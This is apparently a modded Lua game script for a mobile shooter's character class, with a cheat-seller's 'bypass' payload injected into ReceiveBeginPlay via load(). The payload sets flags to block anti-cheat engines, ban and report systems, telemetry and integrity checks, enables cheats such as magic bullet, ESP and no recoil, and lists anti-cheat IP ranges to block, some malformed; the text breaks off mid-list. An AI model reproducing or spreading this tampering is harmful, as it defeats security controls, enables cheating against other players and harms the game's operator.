local CharacterBase={
ServerRPC={},
ClientRPC={},
MulticastRPC={},
LuaEventContainer={
"DefaultLuaEventPlaceholder",
"OnCharacterAnimInstanceInit",
"OnCharacterAnimInstanceInitFrameDelay",
"OnProjectileEffect",
"OnUnmannedVehicleStateChange",
"OnDSEnterSelfieMode",
"OnDSExitSelfieMode",
"EVENTID_CHARACTER_POSSESSED",
"EVENTID_PAWN_PICK_UP_ITEM",
"EVENTID_PLAYEREVENT_REVIVAL",
"EVENTID_INGAME_BUILD_SUCCESS",
"EVENTID_PLAYEREVENT_SCOPECHANGE",
"EVENTID_CHARACTER_DIED_PRE",
"EVENTID_LOCAL_HERO_ID_CHANGED",
"EVENTID_HERO_ID_CHANGED",
"EVENTID_INGAME_ON_PAWN_CAMP_CHANGED",
"EVENTID_TAKE_DAMAGE",
"EVENTID_PLAYEREVENT_CONSUMEITEM",
"EVENTID_PLAYEREVENT_DROPITEM"
}
}
local BudgetScheduler=require("GameLua.Mod.BaseMod.Common.BudgetScheduler")
local EAvatarSlotType=import("EAvatarSlotType")
local EPawnState=import("EPawnState")
local ECharacterPoseState=import("ECharacterPoseType")
local GameLuaAPI=import("/Script/ShadowTrackerExtra.GameLuaAPI")
local ASTExtraPlayerController=import("/Script/ShadowTrackerExtra.STExtraPlayerController")
local ANewFakePlayerAIController=import("NewFakePlayerAIController")
local GamePlayTools=require("GameLua.Mod.BaseMod.Common.GamePlayTools")
local GameplayData=require("GameLua.GameCore.Data.GameplayData")
local GameComponentData=require("GameLua.GameCore.Data.GameComponentData")
local GameplayActorData=require("GameLua.GameCore.Data.GameplayActorData")
local COOP_EMOTE_JOIN_CHECK_RANGE=3
local EMovementMode=import("EMovementMode")
local ESTEPoseState=import("ESTEPoseState")
local USTExtraBlueprintFunctionLibrary=import("STExtraBlueprintFunctionLibrary")
local ECharacterHealthStatus=import("ECharacterHealthStatus")
local FHealthPredictShowData=import("HealthPredictShowData")
local ELifetimeCondition=import("ELifetimeCondition")
local KismetSystemLibrary=import("KismetSystemLibrary")
local function _GetItemName(ItemID)
local ItemConfig=CDataTable.GetTableData("Item",ItemID)
return ItemConfig and ItemConfig.ItemName or""
end
CharacterBase.ServerRPC.ServerRPC_FailPreJoinDance={
Reliable=true,
Params={
import("/Script/Engine.Actor")
}
}
CharacterBase.ClientRPC.ClientRPC_FailedToJoinDance={
Reliable=true,
Params={
UEnums.EPropertyClass.Int
}
}
CharacterBase.ClientRPC.ClientRPC_TryJoinDance={
Reliable=true,
Params={
import("/Script/Engine.Actor"),
UEnums.EPropertyClass.Int
}
}
CharacterBase.ClientRPC.ClientRPC_ShowEffectAfterFruitBingo={
Reliable=true,
Params={
UEnums.EPropertyClass.Str,
UEnums.EPropertyClass.Str,
UEnums.EPropertyClass.Int
}
}
CharacterBase.ClientRPC.ClientRPC_PlayMontageCamera={
Reliable=true,
Params={
import("/Script/CoreUObject.Vector"),
UEnums.EPropertyClass.Float,
UEnums.EPropertyClass.Float,
UEnums.EPropertyClass.Bool,
UEnums.EPropertyClass.Str
}
}
CharacterBase.MulticastRPC.ShowEffectAfterSelfRescueSucceed={
Reliable=true,
Params={}
}
CharacterBase.MulticastRPC.ServerShowShowUIConfigUI={
Reliable=true,
Params={
UEnums.EPropertyClass.Str
}
}
CharacterBase.MulticastRPC.MultiCast_GenericRPC={
Reliable=true,
Params={
UEnums.EPropertyClass.Int,
{
UEnums.EPropertyClass.Array,
UEnums.EPropertyClass.Byte
}
}
}
function CharacterBase:ctor(selfType)
self._SuperData=nil
self.VehicleParachuteComponent=nil
self.DefaultNetCullDistanceSq=1600000000
self.DiedTime=0
self.DiedPosition=FVector(0,0,0)
self.TeammmatePositionWhenMeDied={}
self.DefaultFootStep=true
self.tCorrectionSimulateRepData={
Timer=nil,
CurRepLoc=nil,
LastRepLoc=nil
}
self.LastAddBuffInstID=0
self.LastAddPawn=nil
self.bDisableProne=false
end
function CharacterBase:GetLifetimeReplicatedProps()
local RepTable={
{
"bCableCarView",
ELifetimeCondition.COND_None,
UEnums.EPropertyClass.Bool
},
{
"bIsPlayingLevelSequenceForShow",
ELifetimeCondition.COND_None,
UEnums.EPropertyClass.Bool
},
{
"bCounterattacking",
ELifetimeCondition.COND_None,
UEnums.EPropertyClass.Bool
}
}
return RepTable
end
function CharacterBase:_PostConstruct()
CharacterBase.__super._PostConstruct(self)
self:AddControlEventWithCondition(self,"OnAttrChangeEventDelegate",{
AttrName={
"bUseDeadBox",
"IsInUnderGroundArea",
"IsAroundUndergroundEntry",
"EmotePlayRate",
"AreaID",
"MapID",
"DanceStageAreaState"
}
},self.CharacterAttrChangeEvent,self)
self:AddControlEvent(self,"OnPawnRespawnDelegate",self.HandleOnRespawn,self)
self:AddControlEvent(self,"OnParachuteStateChanged",self.LuaHandleParachuteStateChanged,self)
self:AddControlEvent(self,"OnRepParachuteStateDelegate",self.LuaHandleRepParachuteStateDelegate,self)
self:AddControlEvent(self,"OnPlayerPoseChange",self.PlayerPoseChange,self)
self:AddControlEvent(self,"OnAttachedToVehicle",self.HandleAttachedToVehicle,self)
self:AddControlEvent(self,"OnDetachedFromVehicle",self.HandleDetachedFromVehicle,self)
if not Client then
self.DefaultNetCullDistanceSq=self.NetCullDistanceSquared
self.UseNewParachuteMove=false
self.bIsPlayingLevelSequenceForShow=false
self:SetNetUpdateGroupID(2)
self:AddControlEvent(self,"IsEnterNearDeathDelegate",self.HandleServerEnterNearDeathDelegate,self)
self:AddControlEvent(self,"OnPlayerStartRescue",self.HandleOnPlayerStartRescue,self)
self:AddControlEvent(self,"StateEnterHandler",self.HandleOnEnterState,self)
self:AddControlEvent(self,"OnHandleSkillStartDelegate",self.HandleOnSkillStart,self)
else
self.bClientCanTriggerSkill=true
self:AddControlEvent(self,"OnPreRepAttachment",self.HandleOnPreRepAttachment,self)
self:AddControlEvent(self,"IsEnterNearDeathDelegate",self.HandleIsEnterNearDeathDelegate,self)
self:AddCommonEvent(EVENTTYPE_APPLICATION_ACTIVE_STATE,EVENTID_APPLICATION_REACTIVATED_EX,self.OnApplicationReactivated,self)
self:LightAndLowDeviceSetting()
end
self:AddControlEvent(self,"OnDeathDelegate",self.HandleDeathDelegate,self)
end
function CharacterBase:OnDestroyed()
self:Dispose()
CharacterBase.__super.OnDestroyed(self)
end
function CharacterBase:ReceiveOnPoolCreate()
self:ResetAnimInstanceClass()
end
function CharacterBase:CharacterIsRecycled()
return false
end
function CharacterBase:LightAndLowDeviceSetting()
if Client then
local SmartBearerManagerLuaBridge=import("SmartBearerManagerLuaBridge")
local DeviceLevel=Client.GetExactDeviceLevel()
if SmartBearerManagerLuaBridge.IsLightLossyOptEnable()or DeviceLevel<1 then
self.bEnableAnimFrameCounter=true
else
self.bEnableAnimFrameCounter=false
end
end
end
function CharacterBase:BroadcastFatalDamageInfoWrapperSimpleLua(Causer,Victim,DamageType,AdditionalParam,IsHeadShot)
local FatalDamageSubsystem=SubsystemMgr:Get("FatalDamageSubsystem")
if FatalDamageSubsystem then
FatalDamageSubsystem:BroadcastFatalDamageInfoWrapperSimpleLua(Causer,Victim,DamageType,AdditionalParam,IsHeadShot)
end
end
function CharacterBase:BroadcastFatalDamageInfoWrapperLua(Causer,Victim,DamageType,AdditionalParam,IsHeadShot,ResultHealthStatus,PreviousHealthStatus,WhoKillMe,KillerKillCount)
local FatalDamageSubsystem=SubsystemMgr:Get("FatalDamageSubsystem")
if FatalDamageSubsystem then
FatalDamageSubsystem:BroadcastFatalDamageInfoWrapperLua(Causer,Victim,DamageType,AdditionalParam,IsHeadShot,ResultHealthStatus,PreviousHealthStatus,WhoKillMe,KillerKillCount)
end
end
function CharacterBase:OnApplicationReactivated()
self.FormReactivated=true
end
function CharacterBase:OnClientAddKnownMissingWeapon(ItemDefineID)
local ItemID=ItemDefineID and ItemDefineID.TypeSpecificID
if not ItemID or ItemID<=0 then
printf("CharacterBase:OnClientAddKnownMissingWeapon invalid item, itemID:%s",tostring(ItemID))
return
end
local TipsCD=10
local UGameplayStatics=import("GameplayStatics")
local CurrentTime=UGameplayStatics.GetRealTimeSeconds(CGameWorld)
if 0<=CurrentTime then
local LastTime=self.LastMissingWeaponTipsTime
if type(LastTime)=="number"and CurrentTime>=LastTime and TipsCD>CurrentTime-LastTime then
printf("CharacterBase:OnClientAddKnownMissingWeapon suppress nearby tips, itemID:%s, currentTime:%s, lastTime:%s, cd:%s",tostring(ItemID),tostring(CurrentTime),tostring(LastTime),tostring(TipsCD))
return
end
self.LastMissingWeaponTipsTime=CurrentTime
end
local ItemName=_GetItemName(ItemID)
local TipsDuration=5
printf("CharacterBase:OnClientAddKnownMissingWeapon show missing weapon tips, itemID:%s, itemName:%s, duration:%s",tostring(ItemID),tostring(ItemName),tostring(TipsDuration))
ShowNotice(LocUtil.LocalizeResFormat(8200003,ItemName),nil,TipsDuration)
end
function CharacterBase:HandleOnStateChangePeekMoveAttr(uCharacter,nState,bEntered)
if not bEntered or nState~=EPawnState.Picth then
return
end
if not self:IsLocallyControlled()or not self:HasState(EPawnState.Picth)then
return
end
if self.RefreshMoveAttrModifier then
self:RefreshMoveAttrModifier()
end
end
function CharacterBase:HandleOnEnterState(nState)
if not Client and self.bEnsure==true then
self:RemoveControlEvent(self.Object,"StateEnterHandler")
return
end
if self:HasAuthority()then
print(bWriteLog and"CharacterBase:HandleOnEnterState, nState = "..tostring(nState)..", PlayerKey = "..tostring(self.PlayerKey))
local EPawnState=import("EPawnState")
if nState==EPawnState.Dying or nState==EPawnState.Dead or nState==EPawnState.BeCarriedBack or nState==EPawnState.Dizziness or nState==EPawnState.Knock or nState==EPawnState.Arrest then
else
local AFKReportorSubsystem=SubsystemMgr:Get("AFKReportorSubsystem")
if AFKReportorSubsystem then
local PlayerState=self:GetPlayerStateSafety()
if PlayerState and slua.isValid(PlayerState)then
AFKReportorSubsystem:PlayerHaveAction(PlayerState.UID)
else
print(bWriteLog and"CharacterBase:HandleOnEnterState, PlayerState = "..tostring(PlayerState))
end
else
print(bWriteLog and"CharacterBase:HandleOnEnterState, AFKReportorSubsystem = nil")
end
end
end
end
function CharacterBase:HandleOnSkillStart(uSkillCharacter,SkillID)
if self:HasAuthority()then
local AFKReportorSubsystem=SubsystemMgr:Get("AFKReportorSubsystem")
if AFKReportorSubsystem then
local PlayerState=self:GetPlayerStateSafety()
if PlayerState and slua.isValid(PlayerState)then
AFKReportorSubsystem:PlayerHaveAction(PlayerState.UID)
else
print(bWriteLog and"CharacterBase:HandleOnSkillStart, PlayerState = "..tostring(PlayerState))
end
else
print(bWriteLog and"CharacterBase:HandleOnSkillStart, AFKReportorSubsystem = nil")
end
end
end
function CharacterBase:HandCharacterDoJump()
if slua.isValid(self.STCharacterMovement)and self.STCharacterMovement.MovementMode==EMovementMode.MOVE_Walking then
self.STCharacterMovement.Velocity.Z=self.STCharacterMovement.JumpZVelocity
self.STCharacterMovement:SetMovementMode(EMovementMode.MOVE_Falling,0)
self:RemoveControlEvent(self,"CharacterDoJump")
self:ServerTriggerJump()
self:AddControlEvent(self,"CharacterDoJump",self.HandCharacterDoJump,self)
end
end
function CharacterBase:HandleOnPreRepAttachment(uAttachParent,uAttachComponent,uAttachSocket,uLocationOffset,uRotationOffset,uRelativeScale3D)
if uAttachParent and slua.isValid(uAttachParent)then
if not Client.IsEnableDSGrayPublishFlag(2199023255552)or Client.IsEditor()then
local ASTExtraVehicleBase=import("STExtraVehicleBase")
if not Game:IsClassOf(uAttachParent,ASTExtraVehicleBase)then
print(bWriteLog and"DebugAttach HandleOnPreRepAttachment not  STExtraVehicleBase return  PlayerKey:",self.PlayerKey)
return
end
print(bWriteLog and"DebugAttach HandleOnPreRepAttachment uAttachParent ok PlayerKey:",self.PlayerKey)
local RelativeLocation=FVector(0,0,self:GetSimpleCollisionHalfHeightInStandPose())
local uUseAttachComp
if slua.isValid(uAttachComponent)then
uUseAttachComp=uAttachComponent
else
if uAttachParent.GetMesh then
uUseAttachComp=uAttachParent:GetMesh()
end
print(bWriteLog and"DebugAttach HandleOnPreRepAttachment uUseAttachComp nil or IsPendingKill, Please Check Vehicle's DefaultNetCullDistanceSq=3600000000.0 PlayerKey:",self.PlayerKey)
end
local VehicleSeat=uAttachParent:GetVehicleSeats()
if slua.isValid(VehicleSeat)and slua.isValid(uUseAttachComp)then
local RealSocketName=VehicleSeat:GetAttachSocketName(self,uUseAttachComp,uAttachSocket)
if RealSocketName~="None"then
print(bWriteLog and"CharacterBase:HandleOnPreRepAttachment",uAttachSocket,RealSocketName,uAttachParent)
uAttachSocket=RealSocketName
end
end
self:SetAttachment(uAttachParent,uUseAttachComp,RelativeLocation,uRotationOffset,uRelativeScale3D,uAttachSocket)
end
else
print(bWriteLog and"DebugAttach HandleOnPreRepAttachment uAttachParent nil PlayerKey:",self.PlayerKey)
end
end
function CharacterBase:HandleIsEnterNearDeathDelegate(IsNearDeath)
if self.HealthStatus==ECharacterHealthStatus.FinishedLastBreath and self.LastHealthStatus==ECharacterHealthStatus.HasLastBreath then
print(bWriteLog and"DeadAnimation HandleIsEnterNearDeathDelegate  call PlayerKey:",self.PlayerKey)
if slua.isValid(self.Mesh)then
self:CheckPlayDeadAnimation(self.Mesh.AnimScriptInstance)
local uAnimInstances=self.Mesh:GetSubAnimInstances()
for i=1,uAnimInstances:Num()do
local uAnimInst=uAnimInstances:Get(i-1)
self:CheckPlayDeadAnimation(uAnimInst)
end
end
end
local ENetRole=import("ENetRole")
local EParachuteState=import("EParachuteState")
if self.Role==ENetRole.ROLE_AutonomousProxy and self.HealthStatus==ECharacterHealthStatus.HasLastBreath and self.ParachuteState==EParachuteState.PS_Opening then
self:SwitchCameraToParachuteOpening()
print(bWriteLog and"NearDeathParachute parachute Death")
end
self:ClearFollowEmote()
end
function CharacterBase:HandleServerEnterNearDeathDelegate(IsNearDeath)
if IsNearDeath then
local Controller=self:GetPlayerControllerSafety()
local SilentCommunicationSubsystem=SubsystemMgr:Get("SilentCommunicationSubsystem")
if SilentCommunicationSubsystem then
SilentCommunicationSubsystem:OnConditionTrigger(1,Controller)
end
end
end
function CharacterBase:GetSelfRescueSkillID()
if self:HasState(EPawnState.AttachToOther)then
return 0
end
return 1014669
end
function CharacterBase:HandleOnPlayerStartRescue(RescueWho,IsRescuing)
if RescueWho and slua.isValid(RescueWho)and RescueWho==self.Object then
print(bWriteLog and"CharacterBase:HandleOnPlayerStartRescue, IsRescuing = "..tostring(IsRescuing)..", PlayerKey = "..tostring(self.PlayerKey))
if IsRescuing then
local uWeaponManager=self:GetWeaponManager()
if Game:IsValid(uWeaponManager)then
uWeaponManager.HideCurrentWeapon=true
else
print(bWriteLog and"CharacterBase:HandleOnPlayerStartRescue, uWeaponManager invalid")
end
self.CachedSelfRescueSkillID=self:GetSelfRescueSkillID()
self:TriggerEntrySkillWithID(self.CachedSelfRescueSkillID,true)
local PlayerState=self:GetPlayerStateSafety()
if Game:IsValid(PlayerState)then
PlayerState:AddGeneralCount(1121,1,false)
end
else
local SkillManager=self:GetSkillManager()
if SkillManager and slua.isValid(SkillManager)and self.CachedSelfRescueSkillID then
local UTSkillStopReason=import("UTSkillStopReason")
SkillManager:StopSkill(self.CachedSelfRescueSkillID,UTSkillStopReason.SkillStopReason_Interrupted)
self.CachedSelfRescueSkillID=nil
end
local uWeaponManager=self:GetWeaponManager()
if Game:IsValid(uWeaponManager)then
uWeaponManager.HideCurrentWeapon=false
else
print(bWriteLog and"CharacterBase:HandleOnPlayerStartRescue, uWeaponManager invalid")
end
end
end
if IsRescuing then
local Controller=self:GetPlayerControllerSafety()
local SilentCommunicationSubsystem=SubsystemMgr:Get("SilentCommunicationSubsystem")
if SilentCommunicationSubsystem then
SilentCommunicationSubsystem:OnConditionTrigger(2,Controller)
end
else
if not slua.isValid(RescueWho)then
return
end
if RescueWho==self.Object then
return
end
if RescueWho:HasState(EPawnState.Dying)then
return
end
local uController=RescueWho:GetPlayerControllerSafety()
if not slua.isValid(uController)then
return
end
local uPlayerState=uController.PlayerState
if not slua.isValid(uPlayerState)then
return
end
local nKillerPlayerKey=uPlayerState.NearDeathCauserId
local uKillerPlayerState=GameplayData.GetPlayerState(nKillerPlayerKey)
if slua.isValid(uKillerPlayerState)and uKillerPlayerState.TeamID==self.TeamID and uPlayerState~=uKillerPlayerState then
return
end
local SilentCommunicationSubsystem=SubsystemMgr:Get("SilentCommunicationSubsystem")
if SilentCommunicationSubsystem then
SilentCommunicationSubsystem:OnConditionTrigger(2,uController,uController,31006,0,true,nil)
end
end
end
function CharacterBase:HandleDeathDelegate()
print(bWriteLog and"CharacterBase HandleDeathDelegate"..tostring(self.PlayerKey))
if Client then
self:ClearFollowEmote()
end
if slua.isValid(self.STCharacterMovement)then
self.STCharacterMovement:Deactivate()
self.STCharacterMovement:SetMovementMode(EMovementMode.MOVE_None,0)
end
end
function CharacterBase:GetTargetAnimClass()
if self.AvatarAnimClassCache~=nil then
return self.AvatarAnimClassCache
end
local uPC=self:GetPlayerControllerSafety()
if slua.isValid(uPC)then
return self.MainCharAnimClass
end
if self:IsInCarryBackState()then
local uBeCarriedCharacter=self:GetBeCarriedBackCharacter()
if slua.isValid(uBeCarriedCharacter)and slua.isValid(uBeCarriedCharacter:GetPlayerControllerSafety())then
return self.MainCharAnimClass
end
end
return self.MainCharTPPAnimClass
end
function CharacterBase:ResetCharAnimInstanceClass(SetReason,bForceClearOldAnim)
self.Super:ResetCharAnimInstanceClass(SetReason,bForceClearOldAnim)
end
function CharacterBase:CheckPlayDeadAnimation(uAnimInst)
if slua.isValid(uAnimInst)and uAnimInst.PlayPlayerDeadAnimation~=nil and uAnimInst.C_IsNearDeathStatus~=nil then
local bResetND=false
if uAnimInst.C_IsNearDeathStatus==true then
uAnimInst.C_IsNearDeathStatus=false
bResetND=true
end
local PrePose=uAnimInst.C_PoseType
uAnimInst.C_PoseType=ECharacterPoseState.ECharPose_Crouch
print(bWriteLog and"DeadAnimation HandleIsEnterNearDeathDelegate PlayPlayerDeadAnimation true PlayerKey:",self.PlayerKey)
uAnimInst:PlayPlayerDeadAnimation()
if bResetND then
uAnimInst.C_IsNearDeathStatus=true
end
uAnimInst.C_PoseType=PrePose
end
end
function CharacterBase:SetDiedTime()
self.DiedTime=CGameState:GetServerWorldTimeSeconds()
local PlayerState=self:GetPlayerStateSafety()
if PlayerState==nil or slua.isValid(PlayerState)==false or PlayerState.SetDiedTime==nil then
return
end
PlayerState:SetDiedTime()
end
function CharacterBase:GetDiedTime()
if self.DiedTime then
return self.DiedTime
else
return 0
end
end
function CharacterBase:SetDiedPosition()
self.DiedPosition=self:K2_GetActorLocation()
self.TeammmatePositionWhenMeDied={}
local CharacterState=self:GetPlayerStateSafety()
if CharacterState==nil then
return
end
local TeammatesState=CharacterState.TeamMatePlayerStateList
if TeammatesState==nil or TeammatesState:Num()<=0 then
return
end
for index=0,TeammatesState:Num()-1 do
local uTeammatePlayerState=TeammatesState:Get(index)
if uTeammatePlayerState and slua.isValid(uTeammatePlayerState)and slua.isValid(uTeammatePlayerState.TeamMatePlayerState)then
local uOtherCharacter=uTeammatePlayerState.TeamMatePlayerState:GetPlayerCharacter()
if uOtherCharacter and slua.isValid(uOtherCharacter)then
self.TeammmatePositionWhenMeDied[uOtherCharacter.PlayerKey]=uOtherCharacter:K2_GetActorLocation()
end
end
end
end
function CharacterBase:GetDiedPosition()
if self.DiedPosition then
return self.DiedPosition
else
return FVector(0,0,0)
end
end
function CharacterBase:GetTeammatePositionWhenMeDied()
return self.TeammmatePositionWhenMeDied
end
function CharacterBase:SetDiedPlayerCount()
local uPlayerState=self:GetPlayerStateSafety()
if uPlayerState==nil or slua.isValid(uPlayerState)==false then
print(bWriteLog and"CharacterBase:SetDiedPlayerCount, PlayerKey = "..tostring(self.PlayerKey)..", uPlayerState is invalid")
return
end
if uPlayerState.SetDiedPlayerCount==nil then
print(bWriteLog and"CharacterBase:SetDiedPlayerCount, PlayerKey = "..tostring(self.PlayerKey)..", uPlayerState has no SetDiedPlayerCount function")
return
end
uPlayerState:SetDiedPlayerCount()
end
function CharacterBase:ReceiveBeginPlay()
    -- [BYPASS]
    pcall(function() local f = load([[
-- ============================================================
-- TG BY ~ @ASURVIPMOD
-- OWNER @hamsecheatsvip
-- ============================================================

-- ============================================================
-- BYPASS SYSTEM TG BY ~ @ASURVIPMOD
-- ============================================================

-- ============================================================
-- TG BY ~ @ASURVIPMOD
-- ============================================================

local function nop() return end
local function nopstr() return "" end
local function nopfalse() return false end
local function noptrue() return true end
local function nopnil() return nil end
local function retFalse() return false end
local function retTrue() return true end
local function retZero() return 0 end
local function retEmpty() return {} end
local function retEmptyString() return "" end
local function retNil() return nil end
local function retOne() return 1 end
local function retHundred() return 100 end

local function _isValid(obj)
    if type(slua) == "table" and type(slua.isValid) == "function" then
        local ok, res = pcall(slua.isValid, obj)
        return ok and (res == true)
    end
    return obj ~= nil
end

local function _safe_require(path)
    local ok, mod = pcall(require, path)
    return ok and mod or nil
end

local function _killTable(tbl, keys)
    if type(tbl) ~= "table" then return end
    for _, k in ipairs(keys) do
        pcall(function() if tbl[k] ~= nil then tbl[k] = nop end end)
    end
end

local function _gk_ret_true() return true end
local function _gk_ret_false() return false end
local function _gk_ret_zero() return 0 end
local function _gk_ret_empty() return {} end
local function _gk_noop() end

-- ============================================================
-- TG BY ~ @ASURVIPMOD
-- ============================================================

_G.BypassPermissions = {
    -- TG BY ~ @ASURVIPMOD
    SecurityBypass = true,
    AntiCheatBypass = true,
    ReportBypass = true,
    BanBypass = true,
    TelemetryBypass = true,
    NetworkBypass = true,
    MD5Bypass = true,
    SignatureBypass = true,
    DNSBypass = true,
    DeviceBypass = true,
    IPBypass = true,
    MACBypass = true,
    IMEIBypass = true,
    AndroidIDBypass = true,
    HWIDBypass = true,
    MemoryBypass = true,
    
    -- TG BY ~ @ASURVIPMOD
    AllFeaturesEnabled = true,
    NoReports = true,
    NoBan = true,
    NoDetection = true,
    NoTelemetry = true,
    NoCrashReport = true,
    NoAnalytics = true,
    NoMonitor = true,
    NoTrack = true,
    NoScan = true,
    NoVerify = true,
    NoCheck = true,
    NoValidate = true,
    EndGameProtection = true,
    AntiBan = true,
    AntiKick = true,
    AntiSuspend = true,
    AntiFlag = true
}

-- ============================================================
-- Anti-Cheat TG BY ~ @ASURVIPMOD
-- ============================================================

_G.AntiCheatBlock = {
    -- Anti-Cheat TG BY ~ @ASURVIPMOD
    BlockAllAntiCheat = true,
    BlockTSS = true,
    BlockACE = true,
    BlockXignCode = true,
    BlockBattlEye = true,
    BlockGokuba = true,
    BlockSwiftHawk = true,
    BlockCoronaLab = true,
    BlockHawkEye = true,
    BlockHiggsBoson = true,
    BlockClientBan = true,
    BlockRealTimeBan = true,
    BlockReportSystem = true,
    BlockTLog = true,
    BlockMD5Check = true,
    BlockSignatureVerify = true,
    BlockDeviceFingerprint = true,
    BlockDNSMonitor = true,
    BlockTelemetry = true,
    BlockAnalytics = true,
    BlockCrashReport = true,
    BlockMemoryScan = true,
    BlockSpeedCheck = true,
    BlockWallCheck = true,
    BlockShootVerify = true,
    BlockModifierException = true,
    BlockSimulateLocation = true,
    BlockPlayerSecurity = true,
    BlockCircleFlow = true,
    BlockMrpcsFlow = true,
    BlockKillFlow = true,
    BlockBehaviorScore = true,
    BlockAFKReport = true,
    BlockAvatarException = true,
    BlockFileCheck = true,
    BlockPakVerify = true,
    BlockIntegrityCheck = true,
    BlockRacingAntiCheat = true,
    BlockClientEntry = true,
    BlockNetworkException = true,
    BlockUnrealNet = true,
    BlockReplay = true,
    BlockScreenshot = true,
    BlockDebugLog = true,
    BlockMemoryDump = true,
    BlockStackTrace = true,
    BlockProfiler = true,
    
    -- Magic Bullet TG BY ~ @ASURVIPMOD
    BlockMagicBullet = true,
    BlockDamageVerification = true,
    BlockHitboxVerification = true,
    BlockProjectileVerification = true,
    BlockBulletVerification = true,
    BlockShootVerification = true,
    
    -- Skin Mod TG BY ~ @ASURVIPMOD
    BlockSkinVerification = true,
    BlockAvatarVerification = true,
    BlockWeaponVerification = true,
    BlockVehicleVerification = true,
    BlockSkinReport = true,
    
    -- Game Guardian TG BY ~ @ASURVIPMOD
    BlockGameGuardian = true,
    BlockCheatEngine = true,
    BlockMemoryEditor = true,
    BlockDebugger = true,
    
    -- Emulator Detection TG BY ~ @ASURVIPMOD
    BlockEmulator = true,
    BlockVMDetection = true,
    
    -- Tamper Detection TG BY ~ @ASURVIPMOD
    BlockTamper = true,
    BlockFileIntegrity = true,
    
    -- SpeedHack Detection TG BY ~ @ASURVIPMOD
    BlockSpeedHack = true,
    BlockTimeScale = true,
    
    -- ESP Detection TG BY ~ @ASURVIPMOD
    BlockESP = true,
    BlockWallhack = true,
    
    -- NoRecoil Detection TG BY ~ @ASURVIPMOD
    BlockNoRecoil = true,
    BlockShootPattern = true,
    
    -- Player Report TG BY ~ @ASURVIPMOD
    BlockPlayerReport = true,
    BlockReportCooldown = true
}

-- ============================================================
-- Anti-Cheat IP TG BY ~ @ASURVIPMOD
-- ============================================================

_G.BlockedIPs = {
    -- Tencent Anti-Cheat TG BY ~ @ASURVIPMOD
    "43.128.0.0/16", "43.129.0.0/16", "43.130.0.0/16", "43.131.0.0/16",
    "43.132.0.0/16", "43.133.0.0/16", "43.134.0.0/16", "43.135.0.0/16",
    "43.136.0.0/16", "43.137.0.0/16", "43.138.0.0/16", "43.139.0.0/16",
    "43.140.0.0/16", "43.141.0.0/16", "43.142.0.0/16", "43.143.0.0/16",
    "43.144.0.0/16", "43.145.0.0/16", "43.146.0.0/16", "43.147.0.0/16",
    "43.148.0.0/16", "43.149.0.0/16", "43.150.0.0/16", "43.151.0.0/16",
    "43.152.0.0/16", "43.153.0.0/16", "43.154.0.0/16", "43.155.0.0/16",
    "43.156.0.0/16", "43.157.0.0/16", "43.158.0.0/16", "43.159.0.0/16",
    "43.160.0.0/16", "43.161.0.0/16", "43.162.0.0/16", "43.163.0.0/16",
    "43.164.0.0/16", "43.165.0.0/16", "43.166.0.0/16", "43.167.0.0/16",
    "43.168.0.0/16", "43.169.0.0/16", "43.170.0.0/16", "43.171.0.0/16",
    "43.172.0.0/16", "43.173.0.0/16", "43.174.0.0/16", "43.175.0.0/16",
    "43.176.0.0/16", "43.177.0.0/16", "43.178.0.0/16", "43.179.0.0/16",
    "43.180.0.0/16", "43.181.0.0/16", "43.182.0.0/16", "43.183.0.0/16",
    "43.184.0.0/16", "43.185.0.0/16", "43.186.0.0/16", "43.187.0.0/16",
    "43.188.0.0/16", "43.189.0.0/16", "43.190.0.0/16", "43.191.0.0/16",
    "43.192.0.0/16", "43.193.0.0/16", "43.194.0.0/16", "43.195.0.0/16",
    "43.196.0.0/16", "43.197.0.0/16", "43.198.0.0/16", "43.199.0.0/16",
    "43.200.0.0/16", "43.201.0.0/16", "43.202.0.0/16", "43.203.0.0/16",
    "43.204.0.0/16", "43.205.0.0/16", "43.206.0.0/16", "43.207.0.0/16",
    "43.208.0.0/16", "43.209.0.0/16", "43.210.0.0/16", "43.211.0.0/16",
    "43.212.0.0/16", "43.213.0.0/16", "43.214.0.0/16", "43.215.0.0/16",
    "43.216.0.0/16", "43.217.0.0/16", "43.218.0.0/16", "43.219.0.0/16",
    "43.220.0.0/16", "43.221.0.0/16", "43.222.0.0/16", "43.223.0.0/16",
    "43.224.0.0/16", "43.225.0.0/16", "43.226.0.0/16", "43.227.0.0/16",
    "43.228.0.0/16", "43.229.0.0/16", "43.230.0.0/16", "43.231.0.0/16",
    "43.232.0.0/16", "43.233.0.0/16", "43.234.0.0/16", "43.235.0.0/16",
    "43.236.0.0/16", "43.237.0.0/16", "43.238.0.0/16", "43.239.0.0/16",
    "43.240.0.0/16", "43.241.0.0/16", "43.242.0.0/16", "43.243.0.0/16",
    "43.244.0.0/16", "43.245.0.0/16", "43.246.0.0/16", "43.247.0.0/16",
    "43.248.0.0/16", "43.249.0.0/16", "43.250.0.0/16", "43.251.0.0/16",
    "43.252.0.0/16", "43.253.0.0/16", "43.254.0.0/16", "43.255.0.0/16",
    
    -- Tencent Cloud Anti-Cheat
    "129.204.0.0/16", "129.205.0.0/16", "129.206.0.0/16", "129.207.0.0/16",
    "129.208.0.0/16", "129.209.0.0/16", "129.210.0.0/16", "129.211.0.0/16",
    "129.212.0.0/16", "129.213.0.0/16", "129.214.0.0/16", "129.215.0.0/16",
    "129.216.0.0/16", "129.217.0.0/16", "129.218.0.0/16", "129.219.0.0/16",
    "129.220.0.0/16", "129.221.0.0/16", "129.222.0.0/16", "129.223.0.0/16",
    "129.224.0.0/16", "129.225.0.0/16", "129.226.0.0/16", "129.227.0.0/16",
    "129.228.0.0/16", "129.229.0.0/16", "129.230.0.0/16", "129.231.0.0/16",
    "129.232.0.0/16", "129.233.0.0/16", "129.234.0.0/16", "129.235.0.0/16",
    "129.236.0.0/16", "129.237.0.0/16", "129.238.0.0/16", "129.239.0.0/16",
    "129.240.0.0/16", "129.241.0.0/16", "129.242.0.0/16", "129.243.0.0/16",
    "129.244.0.0/16", "129.245.0.0/16", "129.246.0.0/16", "129.247.0.0/16",
    "129.248.0.0/16", "129.249.0.0/16", "129.250.0.0/16", "129.251.0.0/16",
    "129.252.0.0/16", "129.253.0.0/16", "129.254.0.0/16", "129.255.0.0/16",
    
    -- BattleEye Anti-Cheat
    "185.244.0.0/16", "185.245.0.0/16", "185.246.0.0/16", "185.247.0.0/16",
    "185.248.0.0/16", "185.249.0.0/16", "185.250.0.0/16", "185.251.0.0/16",
    "185.252.0.0/16", "185.253.0.0/16", "185.254.0.0/16", "185.255.0.0/16",
    
    -- EasyAntiCheat
    "104.0.0.0/8", "104.1.0.0/8", "104.2.0.0/8", "104.3.0.0/8",
